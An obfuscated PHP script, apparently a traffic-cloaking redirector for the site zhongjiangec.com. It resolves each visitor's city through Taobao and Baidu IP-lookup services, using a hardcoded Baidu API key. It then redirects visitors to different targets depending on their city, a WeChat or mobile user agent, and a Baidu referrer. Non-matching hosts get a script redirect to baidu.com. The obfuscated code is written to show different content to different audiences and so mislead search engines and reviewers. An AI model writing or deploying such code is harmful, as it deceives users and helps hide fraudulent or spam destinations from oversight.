<?php /* -- enphp : https://github.com/djunny/enphp */ error_reporting(E_ALL^E_NOTICE);define('∞', '—˘’');$GLOBALS[∞] = explode('|<|)|+', 'error_reporting|<|)|+header|<|)|+Content-Type: text/html; charset=utf-8|<|)|+unknown|<|)|+HTTP_X_FORWARDED_FOR|<|)|+strcasecmp|<|)|+REMOTE_ADDR|<|)|+strpos|<|)|+,|<|)|+reset|<|)|+explode|<|)|+getip|<|)|+HTTP_USER_AGENT|<|)|+MicroMessenger|<|)|+WindowsWechat|<|)|+iconv|<|)|+UTF-8|<|)|+UCS-2|<|)|+strlen|<|)|+|<|)|+ord|<|)|+\\u|<|)|+base_convert|<|)|+HTTP_X_WAP_PROFILE|<|)|+HTTP_CLIENT|<|)|+PhoneClient|<|)|+HTTP_VIA|<|)|+stristr|<|)|+wap|<|)|+nokia|<|)|+sony|<|)|+ericsson|<|)|+mot|<|)|+samsung|<|)|+htc|<|)|+sgh|<|)|+lg|<|)|+sharp|<|)|+sie-|<|)|+philips|<|)|+panasonic|<|)|+alcatel|<|)|+lenovo|<|)|+iphone|<|)|+ipod|<|)|+blackberry|<|)|+meizu|<|)|+android|<|)|+netfront|<|)|+symbian|<|)|+ucweb|<|)|+windowsce|<|)|+palm|<|)|+operamini|<|)|+operamobi|<|)|+openwave|<|)|+nexusone|<|)|+cldc|<|)|+midp|<|)|+mobile|<|)|+ipad|<|)|+JUC|<|)|+compatible|<|)|+preg_match|<|)|+/(|<|)|+implode|<|)|+||<|)|+)/i|<|)|+strtolower|<|)|+HTTP_ACCEPT|<|)|+vnd.wap.wml|<|)|+text/html|<|)|+HTTP_REFERER|<|)|+config_url.php|<|)|+file_get_contents|<|)|+http://ip.taobao.com/service/getIpInfo.php?ip=|<|)|+json_decode|<|)|+data|<|)|+region|<|)|+city|<|)|+DG3nSbQFumqucBlZmn0CV4w1abm1zjsH|<|)|+http://api.map.baidu.com/location/ip?ip=|<|)|+&ak=|<|)|+Content-Type:application/json; charset=utf-8|<|)|+curl_init|<|)|+curl_setopt|<|)|+curl_exec|<|)|+curl_errno|<|)|+content|<|)|+address|<|)|+curl_close|<|)|+getCity|<|)|+HTTP_HOST|<|)|+count|<|)|+is_weixin|<|)|+Location:|<|)|+QUERY_STRING|<|)|+zhongjiangec.com|<|)|+baidu.com|<|)|+isMobile|<|)|+ <script>window.location.href="http://www.baidu.com:";</script>');
$GLOBALS{∞}[0](0);
$GLOBALS{∞}{0x001}($GLOBALS{∞}[0x0002]);
function getip()
{$Ω≠Ñ=&$GLOBALS{∞};
    $◊ËËè = $Ω≠Ñ{0x00003};

    if (isset($_SERVER[$Ω≠Ñ[0x000004]]) && $_SERVER[$Ω≠Ñ[0x000004]] && $Ω≠Ñ{0x05}($_SERVER[$Ω≠Ñ[0x000004]], $◊ËËè)) {
        $åÕ˜¯ = $_SERVER[$Ω≠Ñ[0x000004]];
    } elseif (isset($_SERVER[$Ω≠Ñ[0x006]]) && $_SERVER[$Ω≠Ñ[0x006]] && $Ω≠Ñ{0x05}($_SERVER[$Ω≠Ñ[0x006]], $◊ËËè)) {
        $åÕ˜¯ = $_SERVER[$Ω≠Ñ[0x006]];
    }
    
    if (!1 !== $Ω≠Ñ{0x0007}($åÕ˜¯, $Ω≠Ñ[0x00008])) {
        $åÕ˜¯ = $Ω≠Ñ{0x000009}($Ω≠Ñ[0x0a]($Ω≠Ñ[0x00008], $åÕ˜¯));
    }
    return $åÕ˜¯;
}
$ip = $GLOBALS{∞}{0x00b}();
function is_weixin()
{$÷Çﬁ°=&$GLOBALS{∞};
    if ($÷Çﬁ°{0x0007}($_SERVER[$÷Çﬁ°[0x000c]], $÷Çﬁ°{0x0000d}) !== !1) {
        return !0;
    }
    return !1;
}
function is_winweixin()
{$≈ä=&$GLOBALS{∞};
    if ($≈ä{0x0007}($_SERVER[$≈ä[0x000c]], $≈ä[0x00000e]) == !1) {
        return !0;
    }
    return !1;
}
function unicode_encode($˚·ìõ)
{$ò˜=&$GLOBALS{∞};
    $˚·ìõ = $ò˜{0x0f}($ò˜[0x0010], $ò˜{0x00011}, $˚·ìõ);

    $ß‰¡⁄ = $ò˜[0x000012]($˚·ìõ);

    $≤Ç®‡Ñ = $ò˜{0x0000013};

    for ($≠πá = 0; $≠πá < $ß‰¡⁄ - 0x001; $≠πá = $≠πá + 0x0002) {
        $œ± = $˚·ìõ[$≠πá];

        $ØèŸƒ = $˚·ìõ[$≠πá + 0x001];

        if ($ò˜[0x014]($œ±) > 0) {
            $≤Ç®‡Ñ .= $ò˜{0x0015} . $ò˜[0x00016]($ò˜[0x014]($œ±), 0x0a, 0x0010) . $ò˜[0x00016]($ò˜[0x014]($ØèŸƒ), 0x0a, 0x0010);
        } else {
            $≤Ç®‡Ñ .= $ØèŸƒ;
        }
    }
    return $≤Ç®‡Ñ;

}
function ismobile()
{$ÑÈ¿ü=&$GLOBALS{∞};
    if (isset($_SERVER[$ÑÈ¿ü{0x000017}])) {
        return !0;
    }
    if (isset($_SERVER[$ÑÈ¿ü[0x0000018]]) && $ÑÈ¿ü{0x019} == $_SERVER[$ÑÈ¿ü[0x0000018]]) {
        return !0;
    }
    if (isset($_SERVER[$ÑÈ¿ü[0x001a]])) {
        return $ÑÈ¿ü{0x0001b}($_SERVER[$ÑÈ¿ü[0x001a]], $ÑÈ¿ü[0x00001c]) ? !0 : !1;
    }
    if (isset($_SERVER[$ÑÈ¿ü[0x000c]])) {
        $ëÆçÄõ = array($ÑÈ¿ü{0x000001d}, $ÑÈ¿ü[0x01e], $ÑÈ¿ü{0x001f}, $ÑÈ¿ü[0x00020], $ÑÈ¿ü{0x000021}, $ÑÈ¿ü[0x0000022], $ÑÈ¿ü{0x023}, $ÑÈ¿ü[0x0024], $ÑÈ¿ü{0x00025}, $ÑÈ¿ü[0x000026], $ÑÈ¿ü{0x0000027}, $ÑÈ¿ü[0x028], $ÑÈ¿ü{0x0029}, $ÑÈ¿ü[0x0002a], $ÑÈ¿ü{0x00002b}, $ÑÈ¿ü[0x000002c], $ÑÈ¿ü{0x02d}, $ÑÈ¿ü[0x002e], $ÑÈ¿ü{0x0002f}, $ÑÈ¿ü[0x000030], $ÑÈ¿ü{0x0000031}, $ÑÈ¿ü[0x032], $ÑÈ¿ü{0x0033}, $ÑÈ¿ü[0x00034], $ÑÈ¿ü{0x000035}, $ÑÈ¿ü[0x0000036], $ÑÈ¿ü{0x037}, $ÑÈ¿ü[0x0038], $ÑÈ¿ü{0x00039}, $ÑÈ¿ü[0x00003a], $ÑÈ¿ü[0x00001c], $ÑÈ¿ü{0x000003b}, $ÑÈ¿ü{0x0000d}, $ÑÈ¿ü[0x03c], $ÑÈ¿ü{0x003d}, $ÑÈ¿ü[0x0003e]);
                if ($ÑÈ¿ü{0x00003f}($ÑÈ¿ü[0x0000040] . $ÑÈ¿ü{0x041}($ÑÈ¿ü[0x0042], $ëÆçÄõ) . $ÑÈ¿ü{0x00043}, $ÑÈ¿ü[0x000044]($_SERVER[$ÑÈ¿ü[0x000c]]))) {
            return !0;
        }
    }
    if (isset($_SERVER[$ÑÈ¿ü{0x0000045}])) {
        if ($ÑÈ¿ü{0x0007}($_SERVER[$ÑÈ¿ü{0x0000045}], $ÑÈ¿ü[0x046]) !== !1 && ($ÑÈ¿ü{0x0007}($_SERVER[$ÑÈ¿ü{0x0000045}], $ÑÈ¿ü{0x0047}) === !1 || $ÑÈ¿ü{0x0007}($_SERVER[$ÑÈ¿ü{0x0000045}], $ÑÈ¿ü[0x046]) < $ÑÈ¿ü{0x0007}($_SERVER[$ÑÈ¿ü{0x0000045}], $ÑÈ¿ü{0x0047}))) {
            return !0;
        }
    }
    return !1;

}
$fromurl = $_SERVER[$GLOBALS{∞}[0x00048]];
include_once $GLOBALS{∞}{0x000049};
function getCity($¿)
{$„¡í=&$GLOBALS{∞};
    $Ω˛Áâ = $„¡í[0x000004a]($„¡í{0x04b} . $¿);

    $Ω˛Áâ = $„¡í[0x004c]($Ω˛Áâ, !0);

    $…‡ˆˆ = $Ω˛Áâ[$„¡í{0x0004d}][$„¡í[0x00004e]];

    $áÀ– = $Ω˛Áâ[$„¡í{0x0004d}][$„¡í{0x000004f}];

    return $…‡ˆˆ . $áÀ–;

}
function getBCity($É“ﬁÓ )
{$≤£Â˙=&$GLOBALS{∞};
    $·Å÷Ó = $≤£Â˙[0x050];

    $ó = $≤£Â˙{0x0051};

    $∂Ô√ â = $ó . $É“ﬁÓ  . $≤£Â˙[0x00052] . $·Å÷Ó;

    $≤£Â˙{0x001}($≤£Â˙{0x000053});

    $“·ß§ = $≤£Â˙[0x0000054]();

    $≤£Â˙{0x055}($“·ß§, CURLOPT_URL, $∂Ô√ â);

    $≤£Â˙{0x055}($“·ß§, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);

    $≤£Â˙{0x055}($“·ß§, CURLOPT_HEADER, 0);

    $≤£Â˙{0x055}($“·ß§, CURLOPT_RETURNTRANSFER, 0x001);

    $≤£Â˙{0x055}($“·ß§, CURLOPT_RETURNTRANSFER, 0x001);

    $Í´áÑ = $≤£Â˙[0x0056]($“·ß§);

    if ($Í´áÑ === !1) {
        echo $≤£Â˙{0x00057}($“·ß§);
        exit;
    }
    $≠äÒ˝¥ = $≤£Â˙[0x004c]($Í´áÑ, !0);
    return $≠äÒ˝¥[$≤£Â˙[0x000058]][$≤£Â˙{0x0000059}];

    $≤£Â˙[0x05a]($“·ß§);

}

$IP_str = $GLOBALS{∞}{0x005b}($ip);
$l = $_SERVER[$GLOBALS{∞}[0x00048]];
$host = $_SERVER[$GLOBALS{∞}[0x0005c]];
$arrlength = $GLOBALS{∞}{0x00005d}($citys);
$fromlength = $GLOBALS{∞}{0x00005d}($from_domain);
$num = 0;
for ($i = 0; $i < $arrlength; $i++) {
    $num = $num + $GLOBALS{∞}{0x00005d}($GLOBALS{∞}[0x0a]($citys[$i], $IP_str));
            }
if ($isfrom == !0) {
    $dnum = 0x02710;
} else {
    for ($i = 0; $i < $fromlength; $i++) {
        $dnum = $dnum + $GLOBALS{∞}{0x00005d}($GLOBALS{∞}[0x0a]($from_domain[$i], $fromurl));
    }
}
$weixin = $GLOBALS{∞}[0x000005e]();
echo $weixin;
if ($weixin) {
    $GLOBALS{∞}{0x001}($GLOBALS{∞}{0x05f} . $tbk_mobile . $GLOBALS{∞}{0x0000013});
    exit;
}
$fromsogou = $_SERVER[$GLOBALS{∞}[0x0060]];
if ($GLOBALS{∞}{0x0001b}($host, $GLOBALS{∞}{0x00061})) {
    if ($GLOBALS{∞}{0x0001b}($fromurl, $GLOBALS{∞}[0x000062]) == !0) {
        if ($num > $arrlength) {
            $GLOBALS{∞}{0x001}($GLOBALS{∞}{0x05f} . $oth . $GLOBALS{∞}{0x0000013});
            exit;
        } else {
            if ($GLOBALS{∞}{0x0000063}() == !0) {
                $GLOBALS{∞}{0x001}($GLOBALS{∞}{0x05f} . $tbk_mobile . $GLOBALS{∞}{0x0000013});
                exit;
            } else {
                $GLOBALS{∞}{0x001}($GLOBALS{∞}{0x05f} . $tbk . $GLOBALS{∞}{0x0000013});
                exit;
            }
        }
    } else {
        $GLOBALS{∞}{0x001}($GLOBALS{∞}{0x05f} . $oth . $GLOBALS{∞}{0x0000013});
        exit;
                            }
} else {
    echo $GLOBALS{∞}[0x064];
}